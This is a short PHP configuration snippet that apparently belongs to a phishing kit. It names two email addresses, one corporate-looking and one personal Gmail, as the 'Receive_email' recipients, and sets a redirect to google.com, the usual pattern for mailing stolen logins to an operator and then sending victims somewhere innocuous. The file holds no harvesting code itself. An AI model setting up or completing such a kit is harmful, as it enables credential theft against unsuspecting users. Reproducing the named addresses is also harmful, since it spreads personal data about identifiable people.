<?php 
$Receive_email="geanelle.manongdo@novellimo.com,kayleygerhold87@gmail.com";
$redirect="https://www.google.com/";
?>